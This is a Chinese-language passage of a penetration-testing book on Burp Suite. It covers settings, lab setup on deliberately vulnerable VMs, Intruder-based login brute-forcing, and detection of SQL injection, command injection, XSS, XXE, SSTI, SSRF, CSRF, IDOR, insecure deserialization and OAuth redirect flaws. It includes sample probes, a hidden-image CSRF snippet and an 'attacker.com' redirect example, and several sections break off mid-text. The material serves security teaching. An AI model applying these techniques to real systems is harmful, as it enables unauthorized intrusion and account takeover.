下一个选项卡是**其他**选项卡，其中包含特定项目设置的所有杂项设置。以下屏幕截图显示了**其他**选项卡：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/0bce0d73-e8fc-4873-a3dd-58f561408080.png)

**其他**中有以下三个主要设置：

+   **定时任务**

+   Burp Collaborator 服务器

+   **日志**

**定时任务**：在定时任务部分，用户可以指定要执行的特定活动，主要涉及执行方案。用户可以选择在特定时间暂停或恢复执行，以确保时间约束。设置如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/c676ec34-5a72-485c-8fb9-d0f02ec5e766.png)

**Burp Collaborator Server**：Burp Collaborator 是一个外部服务，用于获取带外类型的漏洞。Burp 有一个默认的协作服务器，但如果用户希望，他可以使用此设置配置自己的协作服务器，并可以使用**运行健康检查**选项来了解是否已正确配置。当我们谈论**带外注入**攻击时，我们将更详细地了解 Burp Collaborator。

**日志记录**：这很简单明了。此设置允许用户控制 HTTP 请求的日志记录。用户可以选择需要记录的工具的请求和响应的部分。

这涵盖了**项目** **选项**部分。在扫描期间，除非需要特殊配置，否则大多数情况下这些都不会被更改，因此了解所有这些设置以更好地理解在出现情景时该怎么做是很有必要的。让我们继续下一个选项卡，**用户选项**选项卡。

# 用户选项

**用户选项**选项卡包含用户可以配置的所有设置，以便 Burp 在每次启动时都能默认运行。大多数设置与**项目** **选项**中看到的设置类似；唯一的区别是这是每次运行 Burp 时的永久配置，而**项目选项**仅在项目有特殊要求时配置。

**用户选项**中有以下四个选项卡：

+   **连接**

+   **SSL**

+   **显示**

+   **其他**

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/aa4d09e7-a2a9-44a6-8f5f-11b322fc27ae.png)

让我们看一下以下屏幕截图，以查看**连接**选项卡的可用设置：

**连接**选项卡有以下一组选项：

+   **平台认证 ...**

# 侦察和文件发现

在本模块中，我们将看到如何通过 Burp 进行侦察，以便检测应用程序中的文件和文件夹。这个阶段很重要，因为它有助于映射整个站点结构，因为可能有一些文件夹通过站点超链接不可用，但有时在应用程序上是可用的。通常人们最终会发现很多敏感文件和文件夹托管在网络应用程序的范围内。检测这些文件和文件夹的能力完全取决于可用的字典的强度。让我们继续看看如何使用 Burp Suite 来做到这一点。

# 使用 Burp 进行内容和文件发现

对于本模块，我们将使用**OWASP BWA**并发现可用应用程序中的所有文件和文件夹。我们将看到如何配置和设置 Burp 上必要的参数以执行内容发现。

启动 OWASP BWA VM 并记录 IP 地址，在浏览器中访问应用程序，并在 Burp Suite 中检查您的站点地图。它应该看起来像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/b46e2e2e-84dd-482d-8093-532232ed726d.png)

继续右键单击 URL 地址，然后选择参与工具，然后单击发现内容。它将显示您可以指定以开始自动化...的不同参数集。

# 摘要

简而言之，我们已经看到了应用程序渗透测试的不同阶段，现在我们将开始查看不同的漏洞以及如何使用 Burp 来发现这些漏洞。除此之外，我们还看到了 Burp 中可用的不同功能以及为用户提供的配置，以便轻松使用代理拦截。

在下一章中，我们将规划应用程序渗透测试的方法


# 第五章：准备应用程序渗透测试

在本章中，我们将通过 Burp 对各种易受攻击的应用程序进行渗透测试，以更好地了解如何可以有效地使用 Burp Suite 进行渗透测试。

本章将涵盖以下主题：

+   易受攻击的 Web 应用程序的设置

+   侦察和文件发现

+   使用 Burp 测试身份验证模式

# 易受攻击的 Web 应用程序的设置

为了让我们开始本章，读者将不得不下载以下易受攻击的应用程序：

+   极端易受攻击的 Web 应用程序

+   OWASP Broken Web Applications

# 设置极端易受攻击的 Web 应用程序

为了设置极端易受攻击的 Web 应用程序，请按照以下步骤操作：

1.  下载极端易受攻击的 Web 应用程序；访问[`download.vulnhub.com/xvwa/`](https://download.vulnhub.com/xvwa/)，然后点击`xvwa.iso`。

1.  下载后，打开 VirtualBox，然后点击“新建”。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/a86747de-adb5-4943-9075-10961de7fba1.png)

1.  设置新虚拟机的名称。我们已经给它以下名称：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/80d4adf4-e585-4d98-8014-2f5463b15c48.png)

1.  提供大约 1024 MB 的 RAM，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/cb8b621f-fb84-4a08-8b58-2f476f3b2ee8.png)

1.  接下来，...

# 设置 OWASP Broken Web Application

为了设置 OWASP Broken Web Application，请按照以下步骤操作：

1.  从以下网址下载 OWASP BWA：[`download.vulnhub.com/owaspbwa/`](https://download.vulnhub.com/owaspbwa/)；转到网站，然后点击`OWASP_Broken_Web_Apps_VM_1.2.7z`。

1.  下载后，打开 VirtualBox，并如下图所示，点击“新建”。

1.  设置新虚拟机的名称。我们已经给它以下名称：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/5893c761-1f94-4240-a41c-5c9158398ea6.png)

1.  提供大约 1024 MB 的 RAM，然后选择使用现有的虚拟硬盘文件选项，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/9c04b8ce-c9ab-4672-b432-581f8c4bd3e4.png)

1.  选择提取的 OWASP Web Apps `.vmdk`文件，然后点击创建。这将创建一个虚拟机。要启动此虚拟机，请从虚拟机列表中选择该虚拟机，然后单击“启动”按钮。

# 通过 Burp 进行身份验证测试

本主题主要讨论在没有设置速率限制的情况下尝试暴力破解认证页面。我们将学习如何在各种登录页面上使用 Burp 尝试暴力破解具有一组用户名和密码字典的认证。最后，我们还将检查认证页面是否容易受到 SQL 注入的攻击。

# 使用 Burp Intruder 暴力破解登录页面

让我们不浪费时间，快速前往一些应用程序，看看我们如何使用 Burp 在认证页面上暴力破解凭据。我们将首先暴力破解 OWASP BWA 列表中的 OrangeHRM 应用程序。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/b68a9314-73a9-448e-8841-5bff0669f1c4.png)

一旦您打开应用程序，将显示登录页面；没有注册此应用程序的选项。因此，我们有两个选择，要么测试 SQL 注入，要么暴力破解基于字典的密码，希望其中一个用户名和密码组合有效。以下屏幕截图显示了主页：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/c69978bb-809f-4c5a-ba2c-ddf25fd741f8.png)

该应用程序的默认凭据是`admin`:`admin`，但是，为了展示我们如何可以暴力破解登录页面，密码已更改为另一个字典词。让我们继续输入任意随机用户名和密码，`test`和`test`，然后点击登录。确保在这样做时，您的代理已打开，并且您收到拦截以将此请求发送到入侵者，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/3ce96fac-ce63-4b5c-b79b-8c9671988a5b.png)

转到入侵者选项卡，单击“清除”按钮以删除所有预定义的攻击点。我们的核心关注点是攻击用户名和密码值，因此我们选择用户名和密码字段，并将它们添加到我们的攻击点，并将攻击类型更改为集束炸弹，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/657a6572-c8a7-40cd-a3a4-91c41e77f54d.png)

现在，在我们继续之前，让我们了解为什么选择集束炸弹作为攻击类型。Burp 的入侵者功能中有四种不同类型的攻击类型。这四种攻击类型是：

+   狙击手

+   攻城槌

+   Pitchfork

+   集束炸弹

我们已经在上一章中了解了这些攻击类型。现在我们已经了解了不同的攻击类型，让我们继续使用我们的集束炸弹，并为用户名和密码有效载荷输入值。转到有效载荷部分，选择有效载荷集 1，并在有效载荷选项中选择“从列表添加”，然后选择用户名。如果您使用 Burp Basic，您可以从[`github.com/danielmiessler/SecLists`](https://github.com/danielmiessler/SecLists)下载单词列表，选择“添加”选项，并提供用户名的路径。对于专业用户，请查看以下屏幕截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/283f0b74-34f0-492f-a573-e00a88716800.png)

对于基本用户，一旦下载列表，只需单击“加载...”并提供顶部用户名简表文件的路径，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/76fd4f0c-6776-4ac0-9957-536f95fb10a3.png)

同样，选择有效载荷集 2，并通过从列表中添加选项为专业用户选择密码，对于基本用户，通过加载选项选择。专业用户还可以使用自定义列表，如果不想使用 Burp 中的默认列表。因此，密码的有效载荷集已设置，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/e8099b04-f4e3-49e8-b4df-28ab20d2afbe.png)

配置完成后，我们可以单击“开始攻击”，它将暴力破解一组用户名和密码，如果任何组合命中正确，例如：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/95c9ac8c-9548-4974-8901-d592c8acb198.png)

如您所见，其中一个组合成功了，并且给出了状态 302，这意味着这可能是正确的密码。让我们继续在浏览器中请求。右键单击请求，选择在浏览器中请求，然后在当前会话中，您将看到一个 Burp URL。将其复制并粘贴到 URL 空间中，如下面的屏幕截图所示，您已成功登录：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/d49069ea-b3b3-4c81-8065-7c195a7c97dd.png)

# 测试 SQL 注入的身份验证页面

在本模块中，我们将看到如何执行测试，以验证应用程序的身份验证页面是否容易受到 SQL 注入的攻击。我们将首先了解 SQL 注入如何影响登录页面，它的背景逻辑是什么，以及它如何执行并允许我们登录。然后我们将测试一些应用程序，看看应用程序是否容易受到 SQL 注入的攻击。

测试登录页面的 SQL 注入的魔术字符串具有相同的逻辑，但由于验证的原因表示不同。整个目的是尝试从 SQL 语法的输入字段中出来，并尝试执行有效载荷作为 SQL 查询的一部分，这将导致结果为 true。例如，一些样本...

# 总结

在本章中，我们设置了易受攻击的 Web 应用程序。此外，我们通过 Burp 进行了侦察，以检测应用程序中的文件和文件夹。最后，我们学习了如何在各种登录页面上使用 Burp 尝试使用一组用户名和密码字典进行暴力破解身份验证。

在下一章中，我们将使用 Burp Suite 识别漏洞


# 第六章：使用 Burp Suite 识别漏洞

Burp Suite 不仅是一个 HTTP 代理；它是一套完整的工具，用于检测和利用漏洞。事实上，我们将使用 Burp Suite 向开发人员解释这些漏洞是如何工作的，以一种他们可以理解的方式。在本章中，我们将重点介绍如何使用 Burp Suite 和一些扩展来检测漏洞。我们将涵盖以下主题：

+   检测 SQL 注入漏洞

+   检测操作系统命令注入

+   检测**跨站脚本**（**XSS**）漏洞

+   检测与 XML 相关的问题，如**XML 外部实体**（**XXE**）

+   检测**服务器端模板注入**（**SSTI**）

+   检测**服务器端请求伪造**（**SSRF**）

# 检测 SQL 注入漏洞

SQL 注入是由应用程序中弱输入验证控件生成的漏洞。它允许恶意用户执行任意的 SQL 代码，从而暴露存储的信息，并在一些关键情况下允许完全控制应用程序所在的服务器。

使用 Burp Suite 检测 SQL 注入有三种主要方法：首先，通过手动插入测试字符串；其次，通过使用扫描程序；第三，通过使用名为 CO2 的扩展，该扩展在后台使用**sqlmap**，这是一种用于利用和检测 SQL 注入的工具。让我们来看看这三种方法。

# 手动检测

手动检测意味着逐个分析请求，仅使用**代理**工具和**入侵者**工具，以检测错误或意外行为以检测 SQL 注入。

假设您有一个应用程序，允许用户查看数据库中注册用户的信息；为此，应用程序将使用以下请求：

```
GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1 Host: 192.168.1.72 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://192.168.1.72/dvwa/vulnerabilities/sqli/ Connection: close Cookie: security=low; ...
```

# 扫描程序检测

通过扫描程序，使用 Burp Suite 检测 SQL 注入和任何漏洞的最简单方法。要使用扫描程序，请执行以下操作：

1.  打开 Burp Suite 查看主要仪表板，如下面的屏幕截图所示。请注意，这仅适用于专业版；社区版没有“扫描程序”选项。如果您使用社区版，则使用 ZAP 代理中包含的扫描程序（可以在此处找到：[`www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project`](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project)）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/a10c294b-778f-4eba-af4a-0838278a67bb.png)

1.  在此屏幕上，单击“新扫描”。此按钮将启动配置扫描的向导；在这里，您可以添加要扫描的所有 URL，限制扫描范围，为经过身份验证的扫描设置凭据，并创建特定任务，如过滤器。要执行应用程序扫描，请输入要扫描的 URL，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/f65a1186-879a-4ee1-8c68-64b164b1a5b7.png)

1.  接下来，单击“应用程序登录”并为应用程序添加凭据。在这种情况下，我们为网站添加用户，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/d04d1885-6cd6-4c9d-a7f3-e5b603712cbc.png)

1.  单击“确定”按钮，扫描程序将开始检测，如下面的屏幕截图所示。Burp Suite 将询问您是否需要更多信息来执行扫描：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/0bfa0822-e287-427a-b7ff-0619705953e6.png)

现在，让我们继续下一个检测方法，即 CO2 检测。

# CO2 检测

CO2 是 Burp Suite 的热门扩展，集成了 Python 开发的工具 sqlmap，该工具专注于检测和利用 Web 应用程序中的 SQL 注入。让我们来看一下 CO2 的安装和工作，如下所示：

1.  要安装 CO2，请转到 Burp Suite 中的“扩展”选项卡，然后单击 BApp Store；在这里，您将找到最新版本的列表，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/fefb4d21-10b5-4450-9d4e-b0b09e958273.png)

1.  安装时，点击“安装”按钮，一个新的选项卡将出现在您的 Burp Suite 安装中，如下面的屏幕截图所示：

1.  CO2 实际上只是 sqlmap 的一个前端扩展。要工作，它...

# 检测 OS 命令注入

命令注入是另一个输入验证错误，直接导致与操作系统的交互。通常是因为应用程序使用函数，如`exec()`、`execve()`或`system()`。

像 SQL 注入和本章描述的所有漏洞一样，OS 命令注入可以通过使用扫描器方法和遵循类似的步骤来检测。因此，我们将描述如何以手动方式检测此漏洞。

# 手动检测

要检测命令注入漏洞，请打开 Burp Suite 并拦截您认为存在潜在漏洞的请求。

我们认为 IP 参数存在漏洞。正常应用程序流程是用户插入 IP 地址，然后应用程序执行对此 IP 地址的 ping。如果我们试图想象后端发生了什么，我们可以假设 IP 参数被 PHP 中的一个变量接收；然后它与字符串 ping 连接起来，创建一个包含命令和 IP 地址的字符串。

最后，这个完整的字符串作为参数传递给一个负责在低级命令中执行的函数。因此，如果 IP 参数没有以正确的方式验证...

# 检测 XSS 漏洞

XSS 有三种不同的类型，但它们都有一个共同点——它们源于输入验证错误，以管理用于注入 JavaScript 代码或 HTML 标记的字符。因此，我们可以使用一些输入，如下面的屏幕截图所示（这是 OWASP 项目的备忘单），并将其添加到 Intruder 工具作为负载：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/9c3bedb9-5c5b-454a-94d3-8072437cc666.png)

OWASP 项目的备忘单

检测 XSS 漏洞的方法是在响应的 HTML 中找到这些代码，而不进行编码或修改，或者在注入测试字符串后没有收到错误。

要添加备忘单，请使用类似的过程将负载列表添加到 Intruder 中。打开 Intruder 工具，单击负载选项卡，然后选择加载按钮。最后，标记您认为有漏洞的所有参数，然后单击开始攻击，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/def13e36-7a2d-41e2-964d-173d46fc76d6.png)

易受攻击的参数列表

在前面的屏幕截图中，我们可以看到 Intruder 启动了所有字符串，以及其中一个字符串是如何影响确认的 XSS 响应的。

# 检测与 XML 相关的问题，如 XXE

XML 问题需要请求接受 XML，因此我们需要在头部的`content-type`中包含这些信息，如下所示：

```
text/xml
application/xml
```

我们可以在 Burp Suite 中配置过滤器，以便检测请求头中包含这些信息的请求。要配置过滤器，请转到目标工具，然后单击过滤器栏。一旦在那里，选择 XML 文件格式，如果需要，写入我们知道所有请求都需要具有的`content-type`字符串，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/c94ff119-9be8-4cde-a710-a66585b1f416.png)

在过滤可能存在漏洞的请求之后，在 Intruder 中的负载列表中添加常见的测试字符串...

# 检测 SSTI

SSTI 漏洞在很大程度上取决于被测试应用程序使用的引擎。但是，在模板引擎中的主要思想是传递一个参数，由引擎解释，并创建视图。因此，大多数引擎都在等待解析和显示文本。请以以下内容为例：

```
any=Hello 
<b>Hello</b> 
```

在前面的示例中，应用程序接收一个字符串，引擎会自动添加 HTML 标记以显示它。此外，这些引擎可以解释作为参数传递的值，如运算符。例如：

```
any=Hello ${7*7} 
Hello 49 
```

在这种情况下，引擎使用传递的值评估`*`运算符。因此，如果您将意外的字符串作为参数传递，它可能会被反射，或者可能被用于提取敏感信息，如下所示：

```
personal_greeting=username<tag> 
Hello 

personal_greeting=username}}<tag> 
Hello user01 <tag> 
```

在这里，引擎正在解释参数以显示相关信息，就像是一个查询一样。詹姆斯·凯特尔（James Kettle）在 2015 年创建了一张地图，以依赖于使用的引擎来检测 SSTI 漏洞。以下屏幕截图显示了凯特尔的地图，以检测 SSTI 是否存在，并从输入中推断：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/2af73839-4666-408d-b1d3-d05c0e732cea.png)

使用 Burp Suite 检测 SSTI 漏洞需要手动进行，并涉及捕获和输入测试参数以首先检测使用的引擎，然后检测它是否容易受攻击。

# 检测 SSRF

SSRF 的基本思想是找到可以操纵以访问未经授权资源的内部资源的访问权限。例如，想象一下我们有以下 URL：

```
    https://site.com/process.php?url=192.168.2.34/data/
```

在这种情况下，我们有一个网站，它在`site.com`域名后面是公开的，并且使用从内部 IP 检索的信息进行处理。如果开发人员不验证`url`参数，恶意用户可以访问位于内部 IP 中的未经授权的资源，或者可能是具有相同可见性的其他资源。

要检测这种类型的漏洞，我们可以使用 Burp Suite 的扫描器，它将自动检测它们，或者在目标工具中应用过滤器以查找请求...

# 摘要

在本章中，我们了解了 Burp Suite 用于检测与输入验证弱点相关的最常见漏洞的工具。

大多数漏洞都是使用 Burp Suite 的扫描器检测到的，这是一种在渗透测试人员浏览应用程序时工作的主动扫描器。因此，它更具交互性，并且比其他扫描器具有更多的隐藏区域访问权限。然而，这些漏洞可以通过发送精心制作的请求并注意响应来检测。对于这项任务，Burp Suite 的 Intruder 工具是最有用的工具。

在下一章中，我们将寻找与输入验证无关的错误。


# 第七章：使用 Burp Suite 检测漏洞

正如我们在上一章中看到的，Burp Suite 对于识别不同类型的漏洞非常有用。在上一章中，大部分漏洞都是使用 Intruder 工具检测到的输入验证错误。在本章中，我们将检查与输入验证弱点无关的错误。

本章将涵盖以下主题：

+   检测 CSRF

+   检测不安全的直接对象引用

+   检测安全配置错误

+   检测不安全的反序列化

+   检测与 OAuth 相关的问题

+   检测破损的身份验证

# 检测 CSRF

**跨站请求伪造**（**CSRF**）是一种漏洞，允许恶意用户使用其他应用程序中存储的信息在应用程序中执行操作。例如，想象一下，您只使用一个网络登录到不同的应用程序，这是一个社交网络。如果您向其他站点发送请求，它们将应用更改或操作，因为它们正在使用您提供给**中央**应用程序的信息。

因此，恶意用户可以通过创建一个虚假表单或虚假 URL 来利用应用程序，在该应用程序中执行操作。这迫使用户在不知情的情况下执行应用程序。例如，看看这段 HTML 代码，其中隐藏了一个链接到`<img>`标签中：

```
<img src="img/action" width="0" height="0"> 
```

一开始，你觉得没什么不同，它只是一个无害的 HTML 标记。但是当它被解析时，浏览器会获取标记指向的资源并执行 URL。因此，如果恶意用户隐藏了包含在此标记中的操作的 URL，例如更改密码，操作将被执行。

# 使用 Burp Suite 检测 CSRF

要检测 CSRF 漏洞，首先需要映射所有可能的授权操作。这是因为您需要测试每个操作，以发现是否可能使用存储的信息执行其中任何一个。要映射所有这些操作，您可以使用 Target 工具。

Burp Suite 使用不同类型的方法来映射应用程序。手动地，Burp Suite 可以以被动的方式收集所有请求、资源和 URL；但当然，它仅限于用户的范围。Burp Suite 还可以使用蜘蛛和爬行技术进行自动映射。

在下面的截图中，您可以看到 Burp Suite 正在创建一个应用程序树，其中包含所有操作。...

# 使用 Burp Suite 检测 CSRF 的步骤

当然，Burp Suite 扫描程序能够检测 CSRF 缺陷，但可能会使用参数信息调用函数。为了更可靠地检测，我们将使用代理工具和名为 CSRF 扫描程序的扩展。

1.  要安装 CSRF 扫描程序，请转到 Burp Suite 的 Extender 选项卡，并在 BApp Store 中查找 CSRF Scanner，然后单击安装，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/0b79a3e5-7b21-48a4-a7da-25bd2df02bf6.png)

1.  安装后，Burp Suite 将显示一个新选项卡，显示该工具，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/cddd307e-e9a3-4424-930d-55ad0405ae6f.png)

1.  要检测 CSRF，请进入我们认为存在漏洞的应用程序，并使用拦截按钮拦截请求。请记住，对于所有 CSRF 漏洞，您需要登录或建立会话。右键单击“Engagement tools”，然后生成 CSRF PoC。将打开一个新窗口，其中包含使用请求中公开的数据生成的 HTML 表单，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/a6fedb68-735c-4f5f-b024-cacad08bf1e0.png)

1.  验证所有参数是否包含在表单中，然后将其复制到记事本或其他文本编辑器中，并将其保存为 HTML 文件。然后在 Web 浏览器中打开它。你将只看到一个空白网站和一个按钮，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/039f1c94-3055-475f-95a3-1871b0a5f630.png)

1.  单击“提交请求”，表单将被发送到网站。由于这是一个**概念验证**（**PoC**），页面是故意留空的，但如果需要创建一个更真实的页面，只需将表单添加到页面中。如果操作被执行，该 URL 就容易受到 CSRF 攻击。

最后一个提示是，如果发现应用程序使用了反 CSRF 令牌，请尝试检测漏洞，因为有时开发人员会忘记为所有功能使用令牌，可能会找到一个有漏洞的功能。

# 检测不安全的直接对象引用

当参数获得对某个资源的访问权限时，就会出现**不安全的直接对象引用**（**IDOR**）漏洞。通过修改此参数，可以访问未经授权的其他资源。通常受影响的参数用作应用程序流程的控制，例如命名为`id`、`uid`、`r`、`url`、`ur`等。

可以使用 Burp Suite 中的“目标”工具来检测这些漏洞。与 CSRF 检测类似，您检测到的 URL 越多，发现漏洞的可能性就越大：

1.  将目标添加到范围中，转到 Burp Suite，并使用鼠标的辅助按钮，单击“添加到范围”选项。

1.  然后转到...

# 检测安全配置

安全配置是相对的。在这个类别中，引入了很多可能的错误，使用 Burp Suite 检测它们的最简单和准确的方法是通过扫描器。

1.  打开 Burp Suite，当主仪表板显示时，单击“新扫描”。在这里可以定义要扫描的 URL 和一些选项，比如登录应用程序的凭据，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/6365a938-bd69-4cfb-8fa3-7d62e13b95ee.png)

1.  测试按类别分类。扫描完成后，我们可以看到一些与安全配置有关的问题，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/16543d8a-093a-472e-925d-1fd949202244.png)

正如我们所看到的，有一些问题，比如未加密通信或明文提交密码，我们无法通过分析请求来检测，但扫描器标记了一个问题。

让我们回顾一些常见的安全配置错误，我们将在接下来的章节中详细讨论。

# 未加密通信和明文协议

有一个常见的问题，大多数开发人员和系统管理员没有考虑到；即未加密通信渠道的使用。有些协议以明文形式发送信息，如果恶意用户拦截网络中的流量（这相对容易），则可以查看所有信息，无论其是否敏感。这个问题通常被忽视，因为 Web 应用程序是公开的；但请记住，其中一些是内部的，也可以从公共网络访问。

# 默认凭据

另一个重要问题是可以用来完全控制托管应用程序的服务器的默认凭据。许多 Web 服务器、邮件服务器、数据库服务器、CMS、电子商务工具等在安装时都设有默认密码。对于恶意用户来说，访问这些服务和应用程序是非常容易的。

# 无人值守安装

有时，当系统管理员安装软件时，该软件会附带其他软件包，用于测试目的或作为主要软件的一部分。重要的是要对这些安装进行清单，以便禁止访问或删除，如果可能的话。恶意用户可以发现这些未经监控的安装，并利用它们的漏洞。

# 测试信息

一些应用程序和软件包具有测试信息，如果激活，可能会为恶意用户提供访问权限。例如，一个常见的情况是 Oracle DBMS，它有一个用于测试目的的数据库，其中有一个名为`tiger`的数据库管理员，密码为`scott`。

# 默认页面

应用程序，主要是 Web 服务器，具有默认页面，可能会被恶意用户检测到并作为横幅抓取。

尽管 Burp Suite 扫描器在检测这种问题方面很有用，但我建议使用专注于基础设施的漏洞扫描器，例如 Nessus、Qualys、Outpost24、OpenVAS 等。

# 检测不安全的反序列化

**反序列化**是将某种类型的数据传递给其他数据，由应用程序进行管理的过程，例如，传递一个 JSON 格式的请求，由应用程序解析并以 XML 格式进行管理。此外，还存在涉及开发中使用的技术的反序列化漏洞。这些漏洞将某种类型的资源传递给二进制对象。

要了解漏洞，请查看下面的代码片段，发布在 CVE.2011-2092 中：

```
[RemoteClass(alias="javax.swing.JFrame")] 
public class JFrame { 
   public var title:String = "Gotcha!"; 
   public var defaultCloseOperation:int = 3; 
   public var visible:Boolean = true; 
} 
```

这段代码是称为**JFrame**的数据类型的类定义。在下面的代码片段中，我们可以看到它是如何使用的：

```
InputStream is = request.getInputStream(); 
ObjectInputStream ois = new ObjectInputStream(is); 
AcmeObject acme = (AcmeObject)ois.readObject(); 
```

问题在于任何类型的数据都可以输入到属性中，因为它们没有经过验证，如下面的代码行所示：

```
Set root = new HashSet(); 
Set s1 = root; 
Set s2 = new HashSet(); 
for (int i = 0; i < 100; i++) { 
  Set t1 = new HashSet(); 
  Set t2 = new HashSet(); 
  t1.add("foo"); // make it not equal to t2 
  s1.add(t1); 
  s1.add(t2); 
  s2.add(t1); 
  s2.add(t2); 
  s1 = t1; 
  s2 = t2; 
} 
```

漏洞源于拒绝服务，因此应用程序无法管理输入。这是一种不安全的反序列化漏洞。

# Java Deserialization Scanner

Java Deserialization Scanner 是 Burp Suite 的一个扩展，用于检测以下问题：

+   Apache common collections 3 和 4

+   Spring

+   Java 6、7 和 8

+   Hibernate

+   JSON

+   Rome

+   BeanUtils

1.  要获得它，转到`Extender`工具，单击 BApp Store，然后安装包。安装完成后，Burp Suite 将在界面上显示一个新选项卡，显示工具如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/2d7c668b-0b42-4198-81a7-764164a9b945.png)

1.  单击“配置”选项卡，然后我们可以看到插件中激活的扫描：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/21233bba-91ba-4033-86c3-f7f7bb722b23.png)

1.  现在，要测试一个...

# 检测与 OAuth 相关的问题

OAuth 是一种开放标准，允许在不同应用程序之间共享授权信息，而不共享用户身份。这是 Facebook、Google、Twitter、Plurk 等当前使用的标准。

与 OAuth 相关的最常见问题如下：

+   **不安全的存储机密信息**：OAuth 是存储在客户端的信息。如果应用程序没有以正确的方式存储 OAuth 信息，它会暴露给多个应用程序的访问权限。

+   **缺乏保密性**：OAuth 是一种协议，可以将认证信息与多个应用程序共享，但是，如果与错误的应用程序共享会发生什么呢？嗯，它可能会被其他应用程序重用以窃取用户的访问权限。

+   **URL 重定向**：如果应用程序存在允许重定向的漏洞，恶意用户可以窃取 OAuth 信息。

# 检测 SSO 协议

有一个名为**EsPReSSO**的扩展，可以在 BApp Store 中找到，它可以检测应用程序使用的 SSO 协议并对其进行分类。检测到的协议如下：

+   OpenID

+   BrowserID

+   SAML

+   OAuth

+   OpenID-Connect

+   Facebook Connect

+   Microsoft Account

安装 EsPReSSO 后，当 Burp Suite 检测到 SSO 协议的使用时，它将被标记，并且您可以单击它将其发送到 EsPReSSO 工具以分析它是何种协议，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/f4e7c533-8cf6-480a-a260-4ef555e05bea.png)

# 使用 Burp Suite 检测 OAuth 问题

与 OAuth 相关的问题是如此不同，我们将在以下部分分析其中一些。

# 重定向

打开 Burp Suite，并使用代理工具，检测应用程序中可能的重定向。例如，想象一下，你有一个可以使用社交网络访问的应用程序。这个应用程序有以下 URL：

```
www.site.tv 
```

拦截请求，并将标头中的 URL 修改为以下内容：

```
attacker.com/www.site.tv 
```

社交网络只验证字符串[site.tv](http://site.tv)，并信任应用程序。这是一个漏洞。

# 不安全的存储

Burp Suite 可以检测是否通过不受信任的渠道发送了敏感信息；如果 OAuth 令牌通过明文协议或未加密的渠道发送，它可能会被拦截和重用。

OAuth 问题非常具体，但是考虑到前面提到的问题，可以检测到这些弱点。

# 检测破损的身份验证

